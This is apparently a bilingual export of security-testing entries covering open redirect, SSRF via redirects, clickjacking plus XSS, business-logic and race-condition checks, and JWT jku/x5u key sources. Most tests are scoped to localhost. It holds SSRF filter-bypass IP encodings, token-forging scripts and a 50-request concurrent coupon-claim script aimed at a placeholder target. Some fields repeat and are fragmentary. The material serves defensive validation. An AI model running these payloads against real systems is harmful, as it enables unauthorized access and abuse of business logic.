overview.zh: 开放重定向测试的核心不是堆叠字符串，而是比较输入、一次解码、URL 解析、允许列表判断与最终 Location 生成这几个阶段。样例按单一解析变量拆分，并使用 RFC 保留域名避免把测试流量发送到第三方。
overview.en: Open-redirect testing is about comparing input, one decoding pass, URL parsing, allowlist evaluation, and final Location generation rather than accumulating strings. Each sample changes one parsing variable and uses a reserved domain so test traffic is never sent to a third party.

vulnerability.zh: 当应用把用户输入直接写入 Location，或在解码与规范化前做字符串前缀、后缀或子串判断时，浏览器和服务端可能对主机、userinfo、反斜杠与片段得出不同结果。只有最终 Location 或浏览器导航离开批准源时才确认开放重定向。
vulnerability.en: A vulnerability arises when user input is written directly to Location or checked with string prefixes, suffixes, or substrings before decoding and normalization, allowing browser and server disagreement over hosts, userinfo, backslashes, or fragments. Confirm only when the final Location or browser navigation leaves the approved origin.

exploitation.zh: 先提交同源相对路径建立基线，再逐个测试编码、userinfo、反斜杠、协议相对 URL、片段和双重编码 CRLF。每次保存原始参数、服务端规范化值与响应 Header；默认关闭 curl 跟随跳转。若应用拒绝输入或把目标固定到同源路径，应记录为有效防护。
exploitation.en: Start with a same-origin relative path, then test encoding, userinfo, backslashes, protocol-relative URLs, fragments, and double-encoded CRLF one at a time. Preserve the raw parameter, server-normalized value, and response headers with redirect following disabled. Rejection or canonicalization to a same-origin path is valid protection.

mitigation.zh: 尽量使用服务端定义的目标标识符或固定相对路径，不接受任意绝对 URL。必须支持外部目标时，使用标准 URL 解析器完成一次明确解码，拒绝 userinfo、控制字符和非 HTTP(S) Scheme，再对规范化后的 scheme、host 与 port 做精确允许列表判断。
mitigation.en: Prefer server-defined destination identifiers or fixed relative paths and do not accept arbitrary absolute URLs. When external destinations are required, use a standard URL parser with one explicit decoding pass, reject userinfo, control characters, and non-HTTP(S) schemes, then apply an exact allowlist to normalized scheme, host, and port.

name.zh: 重定向逐跳 SSRF 策略验证

description.zh: 验证服务端取回器是否在每一次重定向后重新解析目标、规范化地址并阻止回环、私网、链路本地与其他非批准地址。
description.en: 验证服务端取回器是否在每一次重定向后重新解析目标、规范化地址并阻止回环、私网、链路本地与其他非批准地址。

prerequisites.zh: 所有服务运行在 127.0.0.1 实验网络：18080 为取回器与重定向器，18081 为只返回 marker 的内部 Fixture。
prerequisites.en: Run every service in the 127.0.0.1 lab network: port 18080 hosts the fetcher and redirector, while 18081 hosts a marker-only internal fixture.

prerequisites.zh: 取回器日志能够记录每跳 URL、解析地址、重定向次数、策略结果和 request_id，且不允许访问云元数据。
prerequisites.en: Fetcher logs record each-hop URL, resolved address, redirect count, policy result, and request_id, with cloud metadata access disabled.

title.zh: 一跳回环阻断样例

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -G "http://127.0.0.1:18080/lab/fetch" --data-urlencode "url=http://127.0.0.1:18080/lab/redirect?next=http://127.0.0.1:18081/lab/internal/canary" -H "X-Request-ID: redirect-ssrf-a1" | jq -e '.request_id == "redirect-ssrf-a1" and .redirect_count == 1 and .final_address == "127.0.0.1" and .blocked == true'

description.zh: 让本地取回器处理一跳重定向到独立回环 canary，并断言最终地址被重新校验和阻断。
description.en: Have the local fetcher process one redirect to an independent loopback canary and assert that the final address is revalidated and blocked.

analysis.zh: 阳性必须证明最终禁止地址实际收到请求或内部 marker 被取回，并由同一 request_id 关联每跳日志。Location 指向内网、策略输出 blocked、解析器显示特殊地址或请求超时都不能单独证明边界已被穿透。
analysis.en: A positive requires the prohibited final address to receive a request or return the internal marker, correlated across every hop with one request_id. A Location pointing inward, a blocked policy result, a special resolver output, or a timeout alone does not prove boundary crossing.

opsecTips.zh: 只使用两个登记的回环端口和固定 canary 路径，禁止扫描端口、云元数据、宿主服务或企业网段。
opsecTips.en: Use only the two registered loopback ports and fixed canary path; do not scan ports, cloud metadata, host services, or enterprise ranges.

opsecTips.zh: 每次请求限制一跳和五秒超时，完成后清理解析缓存与 marker 日志并确认内部 Fixture 没有残留连接。
opsecTips.en: Limit each request to one hop and five seconds, then clear resolver caches and marker logs and confirm no residual internal-fixture connections.

title.zh: IPv4-Mapped IPv6 阻断样例

description.zh: 把内部目标写成 IPv4-mapped IPv6，验证规范化后仍按回环地址阻断。
description.en: Represent the internal target as IPv4-mapped IPv6 and verify that normalization still blocks it as loopback.

title.zh: 替代 IP 文本规范化样例

wafBypass.command: for value in 2130706433 0177.0.0.1 0x7f.0.0.1 127.1 "[::1]" "[::ffff:7f00:1]"; do curl --silent --show-error --max-time 5 -G "http://127.0.0.1:18080/lab/url-policy" --data-urlencode "url=http://$value:18081/lab/internal/canary" | jq -c '{input,normalized_address,blocked}'; done

description.zh: 逐个提交登记的替代 IP 文本并输出规范地址与阻断结果，不连接内部服务。
description.en: Submit registered alternative IP text forms and output normalized addresses plus blocking results without connecting to internal services.

title.zh: 固定取回器与解析基线
title.en: Fix the fetcher and resolver baseline

description.zh: 记录正常 marker 的初始 URL、解析地址、状态和零重定向结果。
description.en: Record initial URL, resolved address, status, and zero-redirect result for the normal marker.

title.zh: 提交本地一跳重定向

description.zh: 把重定向器作为允许入口并指向内部 canary，观察每跳策略是否在连接前执行。
description.en: Use the redirector as the allowed entry and target the internal canary, observing whether per-hop policy runs before connection.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -G "http://127.0.0.1:18080/lab/fetch" --data-urlencode "url=http://127.0.0.1:18080/lab/redirect?next=http://127.0.0.1:18081/lab/internal/canary" -H "X-Request-ID: redirect-ssrf-a1" | jq -e '.request_id == "redirect-ssrf-a1" and .redirect_count == 1 and .final_address == "127.0.0.1" and .blocked == true'

title.zh: 复核地址规范化

description.zh: 分别提交 IPv4-mapped IPv6 和替代 IP 文本，要求规范化后仍命中禁止地址集合。
description.en: Submit IPv4-mapped IPv6 and alternative IP text forms separately and require normalized addresses to remain blocked.

title.zh: 修复后关联日志回归

description.zh: 修复后重放全部样例，要求日志显示每跳重新校验且内部 Fixture 没有请求记录。
description.en: Replay every sample after remediation and require logs to show per-hop revalidation with no request at the internal fixture.

overview.zh: SSRF 防护不能只校验初始 URL；HTTP 重定向会产生新的 scheme、host、port 和 DNS 解析结果，必须在每一跳重复相同的目标策略。本条目用双端口本地 Fixture 验证阻断行为，并把端点矩阵、策略导出、有限对照和解析器检查迁入工具区。
overview.en: SSRF defenses cannot validate only the initial URL. HTTP redirects create a new scheme, host, port, and DNS result that require the same destination policy at every hop. This entry uses a two-port local fixture to validate blocking and moves endpoint matrices, policy export, bounded controls, and resolver inspection into tools.

vulnerability.zh: 如果取回器只允许初始域名，却自动跟随到回环、私网或链路本地地址，攻击者可能跨越网络信任边界。确认问题必须由同一 request_id 证明初始 URL 通过策略、后续 Location 被跟随、最终地址属于禁止范围且内部 marker 被读取；只看到 3xx 或超时并不足够。
vulnerability.en: If a fetcher allowlists only the initial host but automatically follows a redirect to loopback, private, or link-local space, an attacker may cross a network trust boundary. Confirmation requires one request_id proving that the initial URL passed policy, a later Location was followed, the final address was prohibited, and an internal marker was read. A 3xx response or timeout alone is insufficient.

exploitation.zh: 先请求正常公共 marker 建立基线，再把本地重定向 URL 作为 fetch 参数，目标指向 18081 的内部 canary。随后分别验证 IPv4-mapped IPv6 和替代 IP 文本形式，要求策略在建立连接前阻断。每次最多允许一跳并保存解析日志，不探测端口、不读取元数据也不枚举路径。
exploitation.en: First request a normal public marker baseline, then pass the local redirect URL to the fetcher with the target set to the internal canary on port 18081. Validate IPv4-mapped IPv6 and alternative IP text forms separately and require blocking before connection. Allow at most one hop and preserve resolver logs without scanning ports, reading metadata, or enumerating paths.

mitigation.zh: 默认禁用自动重定向；必须跟随时限制跳数，并在每一跳重新解析和验证 scheme、规范化 host、port 与所有 DNS 地址。连接前后防止 DNS TOCTOU，拒绝回环、私网、链路本地、保留和 Unix Socket 等目标，通过受控代理与网络出口策略形成第二道边界。
mitigation.en: Disable automatic redirects by default. When following is required, cap hop count and revalidate scheme, normalized host, port, and every DNS address at each hop. Prevent DNS TOCTOU around connection, reject loopback, private, link-local, reserved, and Unix-socket destinations, and add controlled proxy plus network-egress policy as a second boundary.

name.zh: 点击劫持与交互型 XSS 边界

description.zh: 验证可被 Frame 嵌入的本地页面是否需要用户交互才能让无害 DOM marker 进入可执行 Sink，并分别记录 Frame、交互和 XSS 三层证据。
description.en: Validate whether a locally framed page requires user interaction for a harmless DOM marker to reach an executable sink, recording framing, interaction, and XSS as separate evidence layers.

subCategory.zh: 交互型 XSS 组合边界

prerequisites.zh: 使用 127.0.0.1 浏览器 Fixture，目标操作只写入合成 DOM marker，不读取 Cookie 或存储。
prerequisites.en: Use the 127.0.0.1 browser fixture, where the target action writes only a synthetic DOM marker and reads no cookies or storage.

prerequisites.zh: 在 Chromium 中同时保存 Frame 拒绝消息、用户交互事件、最终 DOM 快照和 CSP violation。
prerequisites.en: Preserve frame-refusal messages, user interaction events, final DOM snapshots, and CSP violations together in Chromium.

execution.command: CJ_XSS_STEP_A1

description.zh: 以低透明度显示本地 Frame 和 marker，验证交互对齐而不操作剪贴板。

analysis.en: Report framing, interaction, and sink conclusions separately; when one layer is missing, report only the independent issue. Confirm composed impact only when the target page interprets the marker in an executable browser context triggered by the clickjacking flow.

opsecTips.zh: Payload 不读取 Cookie、LocalStorage、表单值或响应数据，也不写剪贴板或向外部地址发送请求。

description.en: Drag a text/plain marker into a local editable preview to validate the input path without HTML injection.

title.zh: 分别建立 Frame 与 Sink 基线
title.en: Establish separate frame and sink baselines

description.zh: 先记录页面直接访问、Frame 访问和普通文本输入的 DOM 与响应头基线。
description.en: Record direct navigation, framed navigation, and plain-text DOM plus response-header baselines first.

title.zh: 执行可见多步交互

description.zh: 保持 Frame 可见并使用唯一 marker，确认用户事件确实到达目标页面控件。

attackChain.payload: CJ_XSS_STEP_A1

title.zh: 验证无害 DOM 解释

description.zh: 检查 body.dataset.lab 和 CSP violation，区分文本渲染、HTML 解析与可执行事件。
description.en: Inspect body.dataset.lab and CSP violations to distinguish text rendering, HTML parsing, and executable events.

title.zh: 修复后重放组合流程
title.en: Replay the composed flow after remediation

description.zh: 修复后要求 Frame 被拒绝或 marker 仅按文本处理，且服务端没有组合链请求。
description.en: After remediation, require framing rejection or text-only marker handling with no composed-chain request at the server.

overview.zh: 点击劫持与 XSS 组合成立，需要页面可被跨站 Frame 加载、诱导交互可到达目标控件、输入进入可执行 DOM Sink 三个条件依次满足。旧内容把 Self-XSS、剪贴板写入、Frame Sandbox 和 CSP 混为绕过。本条目改用可见 Frame 与本地 DOM marker，探测与浏览器回归迁入工具区。
overview.en: A clickjacking-plus-XSS chain requires the page to be cross-site frameable, induced interaction to reach the intended control, and input to enter an executable DOM sink in sequence. The old content mixed self-XSS, clipboard writes, frame sandboxing, and CSP bypass claims. This entry uses visible frames plus local DOM markers and moves probing and browser regression into tools.

vulnerability.zh: 可嵌入页面不代表 XSS，页面存在 XSS 也不代表点击劫持能触发。确认组合链必须证明同一浏览器流程中 Frame 成功、交互到达、marker 被目标页面解释，并排除用户主动粘贴任意代码、同源测试页面和直接导航。只出现 alert、响应头缺失或 HTML 字符串都不是完整证据。
vulnerability.en: A frameable page does not prove XSS, and XSS does not prove clickjacking can trigger it. Confirm the composed chain only when one browser flow proves successful framing, delivered interaction, and target-side marker interpretation, excluding arbitrary user-pasted code, same-origin test pages, and direct navigation. An alert, missing header, or HTML string alone is incomplete evidence.

exploitation.zh: 先用低透明度多步页面确认控件位置与交互事件，再加载本地 xss-preview 并提交只设置 body.dataset.lab 的事件 marker。随后分别测试 srcdoc、Sandbox 与拖拽文本路径，每个上下文只运行一次并保存 DOM 快照。不写剪贴板、不读取 Cookie、不外带响应。
exploitation.en: First use a low-opacity multi-step page to confirm control positions and interaction events, then load the local xss-preview with an event marker that only sets body.dataset.lab. Test srcdoc, sandbox, and plain-text drag paths separately, once per context, and preserve DOM snapshots. Do not write the clipboard, read cookies, or exfiltrate responses.

mitigation.zh: 使用 CSP frame-ancestors 和必要的 X-Frame-Options 阻止非批准嵌入；对状态变更要求 CSRF 防护和确认。DOM 写入使用 textContent 或严格 Sanitizer，避免把 URL、剪贴板和拖拽 HTML 直接交给 innerHTML，并部署不允许 inline script 的 CSP。
mitigation.en: Use CSP frame-ancestors and X-Frame-Options where needed to prevent unapproved framing, and require CSRF protection plus confirmation for state changes. Write DOM with text Content or a strict sanitizer, avoid passing URL, clipboard, or dragged HTML directly to inner HTML, and deploy CSP without inline scripts.

overview.zh: 对象级授权跨账号验证聚焦以下边界：仅使用两个专用实验账号和一个固定对象，验证主体、对象与动作是否在服务端重新绑定。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Cross-Account Object-Level Authorization Validation focuses on this boundary: Uses only two dedicated lab accounts and one fixed object to test whether subject, object, and action are rebound on the server. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。
vulnerability.en: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。

exploitation.zh: 使用两个专用账号、固定沙箱对象和唯一 PAYLOADER_BUSINESS 标记记录正常基线，再只改变一个对象、金额、状态或顺序变量。阳性需要数据库状态、账本、审计日志或后续读取证明未授权结果；前端显示、HTTP 200 或修改客户端响应均不足。
exploitation.en: Use two dedicated accounts, a fixed sandbox object, and a unique PAYLOADER_BUSINESS marker to record a normal baseline, then change only one object, amount, state, or ordering variable. A positive result requires database state, ledger, audit logs, or a follow-up read proving an unauthorized outcome; UI display, HTTP 200, or a modified client response is insufficient.

mitigation.zh: 在服务端逐请求执行对象级授权，从可信目录和价格规则重算结果，对敏感状态转换使用事务、唯一约束、幂等键和一次性令牌，并对验证码与重置令牌绑定主体、用途、时效和尝试次数。对异常状态转换与重复消费建立审计。
mitigation.en: Enforce object-level authorization on every request, recalculate outcomes from trusted catalogs and pricing rules, use transactions, unique constraints, idempotency keys, and one-time tokens for sensitive transitions, and bind CAPTCHA plus reset tokens to subject, purpose, lifetime, and attempt limits. Audit abnormal transitions and duplicate consumption.

title.zh: 2. Python并发测试脚本

execution.command:
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)

overview.zh: 业务状态并发原子性验证聚焦以下边界：最多并发两个可回滚实验请求，验证限额、余额或状态转换是否由原子事务保护。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: 业务状态并发原子性验证聚焦以下边界：最多并发两个可回滚实验请求，验证限额、余额或状态转换是否由原子事务保护。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。
vulnerability.en: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。

exploitation.zh: 使用两个专用账号、固定沙箱对象和唯一 PAYLOADER_BUSINESS 标记记录正常基线，再只改变一个对象、金额、状态或顺序变量。阳性需要数据库状态、账本、审计日志或后续读取证明未授权结果；前端显示、HTTP 200 或修改客户端响应均不足。
exploitation.en: Use two dedicated accounts, a fixed sandbox object, and a unique PAYLOADER_BUSINESS marker to record a normal baseline, then change only one object, amount, state, or ordering variable. A positive result requires database state, ledger, audit logs, or a follow-up read proving an unauthorized outcome; UI display, HTTP 200, or a modified client response is insufficient.

mitigation.zh: 在服务端逐请求执行对象级授权，从可信目录和价格规则重算结果，对敏感状态转换使用事务、唯一约束、幂等键和一次性令牌，并对验证码与重置令牌绑定主体、用途、时效和尝试次数。对异常状态转换与重复消费建立审计。
mitigation.en: Enforce object-level authorization on every request, recalculate outcomes from trusted catalogs and pricing rules, use transactions, unique constraints, idempotency keys, and one-time tokens for sensitive transitions, and bind CAPTCHA plus reset tokens to subject, purpose, lifetime, and attempt limits. Audit abnormal transitions and duplicate consumption.

overview.zh: 密码重置令牌绑定验证聚焦以下边界：使用自有测试邮箱验证令牌的一次性、时效、账号绑定和可信链接来源，不枚举或爆破验证码。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Password-Reset Token Binding Validation focuses on this boundary: Uses an owned test mailbox to validate one-time use, expiry, account binding, and trusted link origin without enumerating or brute-forcing codes. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。
vulnerability.en: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。

exploitation.zh: 使用两个专用账号、固定沙箱对象和唯一 PAYLOADER_BUSINESS 标记记录正常基线，再只改变一个对象、金额、状态或顺序变量。阳性需要数据库状态、账本、审计日志或后续读取证明未授权结果；前端显示、HTTP 200 或修改客户端响应均不足。
exploitation.en: Use two dedicated accounts, a fixed sandbox object, and a unique PAYLOADER_BUSINESS marker to record a normal baseline, then change only one object, amount, state, or ordering variable. A positive result requires database state, ledger, audit logs, or a follow-up read proving an unauthorized outcome; UI display, HTTP 200, or a modified client response is insufficient.

mitigation.zh: 在服务端逐请求执行对象级授权，从可信目录和价格规则重算结果，对敏感状态转换使用事务、唯一约束、幂等键和一次性令牌，并对验证码与重置令牌绑定主体、用途、时效和尝试次数。对异常状态转换与重复消费建立审计。
mitigation.en: Enforce object-level authorization on every request, recalculate outcomes from trusted catalogs and pricing rules, use transactions, unique constraints, idempotency keys, and one-time tokens for sensitive transitions, and bind CAPTCHA plus reset tokens to subject, purpose, lifetime, and attempt limits. Audit abnormal transitions and duplicate consumption.

overview.en: 验证码服务端消费验证聚焦以下边界：使用一个专用验证码 ID 和一次正确/一次错误对照，验证服务端绑定、过期与单次消费。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。
vulnerability.en: 业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。

exploitation.zh: 使用两个专用账号、固定沙箱对象和唯一 PAYLOADER_BUSINESS 标记记录正常基线，再只改变一个对象、金额、状态或顺序变量。阳性需要数据库状态、账本、审计日志或后续读取证明未授权结果；前端显示、HTTP 200 或修改客户端响应均不足。
exploitation.en: Use two dedicated accounts, a fixed sandbox object, and a unique PAYLOADER_BUSINESS marker to record a normal baseline, then change only one object, amount, state, or ordering variable. A positive result requires database state, ledger, audit logs, or a follow-up read proving an unauthorized outcome; UI display, HTTP 200, or a modified client response is insufficient.

mitigation.zh: 在服务端逐请求执行对象级授权，从可信目录和价格规则重算结果，对敏感状态转换使用事务、唯一约束、幂等键和一次性令牌，并对验证码与重置令牌绑定主体、用途、时效和尝试次数。对异常状态转换与重复消费建立审计。
mitigation.en: Enforce object-level authorization on every request, recalculate outcomes from trusted catalogs and pricing rules, use transactions, unique constraints, idempotency keys, and one-time tokens for sensitive transitions, and bind CAPTCHA plus reset tokens to subject, purpose, lifetime, and attempt limits. Audit abnormal transitions and duplicate consumption.

name.zh: JWT JKU Key 来源允许列表

description.zh: 使用仅监听 localhost 的 JWK Set fixture，确认 token 自带 jku 只有在与测试 issuer 的预配置 URL 完全匹配时才可能被解析。
description.en: Uses a localhost-only JWK Set fixture to confirm that token-supplied jku is considered only when it exactly matches the URL preconfigured for the test issuer.

subCategory.zh: JWT JKU Key 来源允许列表

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT JKU Key 来源允许列表对照 1
title.en: JWT JKU Key Source Allowlisting Control 1

execution.command:
python3 - <<'PY'
import jwt, time, urllib.error, urllib.request
private_key = open(".payloader-jwt-fixture/private.pem", "rb").read()
token = jwt.encode(
    {"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60},
    private_key,
    algorithm="RS256",
    headers={"typ":"payloader+jwt","kid":"PAYLOADER_LOCAL_KEY","jku":"http://127.0.0.1:18080/jwks.json"},
)
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: reject unless the exact localhost JKU is preconfigured for the test issuer; arbitrary token-supplied URLs are never followed.

description.zh: 在隔离环境执行该JWT JKU Key 来源允许列表对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。
description.en: 在隔离环境执行该JWT JKU Key 来源允许列表对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。

analysis.zh: 该审校聚焦JWT JKU 与 X5U Key 来源边界。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This review focuses on JWT JKU and X5U Key Source Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

title.zh: 建立JWT JKU Key 来源允许列表基线
title.en: Baseline JWT JKU Key Source Allowlisting

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT JKU Key 来源允许列表阴性对照
title.en: Submit the JWT JKU Key Source Allowlisting Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

title.zh: 确认验证器拒绝分支

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

title.zh: 撤销 fixture 并回归

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

overview.zh: JWT JKU 与 X5U Key 来源边界必须按 token 类型、算法、key 来源和 claim profile 分别验证；JWT 可被解码是格式属性，不代表签名或授权有效。
overview.en: JWT JKU and X5U Key Source Boundaries must be validated separately by token type, algorithm, key source, and claim profile; JWT decodability is a format property and does not imply valid signatures or authorization.

vulnerability.zh: 根因通常是验证器相信 token 自带的 alg、jwk、jku、x5u、x5c 或 kid，混用 HMAC 与非对称 key，使用低熵 HMAC key，或遗漏 issuer、audience、时间和 token type 校验。
vulnerability.en: Root causes include trusting token-supplied alg, jwk, jku, x5u, x5c, or kid values, mixing HMAC and asymmetric keys, using low-entropy HMAC keys, or omitting issuer, audience, time, and token-type validation.

exploitation.zh: 先用本地测试 issuer 生成短期有效 token 并访问只读标记，再一次只改变一个算法、key 引用或 claim。验证器必须显式固定允许算法和 key，并记录 issuer、audience、type 与时间检查结果。
exploitation.en: Generate a short-lived valid token from the local test issuer and access the read-only marker, then change exactly one algorithm, key reference, or claim. The verifier must explicitly pin algorithms and keys and log issuer, audience, type, and time checks.

mitigation.zh: 按 token 类型使用互斥验证规则，固定算法与 key 类型，使用高熵 HMAC key；只从 issuer 配置的受信来源解析 key，允许列表化 kid 与 jku/x5u，并严格校验 iss、aud、exp、nbf 和 typ。
mitigation.en: Use mutually exclusive validation rules per token type, pin algorithms and key types, and use high-entropy HMAC keys; resolve keys only from issuer-configured trusted sources, allowlist kid and jku/x5u, and strictly validate iss, aud, exp, nbf, and typ.

description.zh: 使用 localhost 证书 fixture 检查 x5u URL 和证书链信任，验证器不得跟随任意 token 提供的证书位置。

title.en: JWT X5U Certificate Source Allowlisting Control 1

    {"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60},
    private_key,
    algorithm="RS256",
    headers={"typ":"payloader+jwt","kid":"PAYLOADER_LOCAL_KEY","x5u":"http://127.0.0.1:18080/test-cert.pem"},
)

try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: reject unless the exact local X5U and certificate chain are preconfigured and trusted for the issuer.
